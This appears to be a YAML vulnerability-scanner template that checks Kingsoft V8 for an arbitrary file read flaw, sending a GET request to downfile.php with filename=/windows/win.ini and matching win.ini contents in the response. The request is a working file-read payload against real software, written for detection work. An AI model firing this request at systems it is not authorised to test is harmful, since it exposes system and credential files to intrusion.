id: kingsoft-v8-file-read

info:
    name: Kingsoft V8 File Read
    author: kzaopa(https://github.com/kzaopa)
    severity: high
    verified: false

rules:
    r0:
        request:
            method: GET
            path: /htmltopdf/downfile.php?filename=/windows/win.ini
        expression: response.status == 200 && response.body.bcontains(b'bit app support') && response.body.bcontains(b'fonts') && response.body.bcontains(b'extensions')
expression: r0()
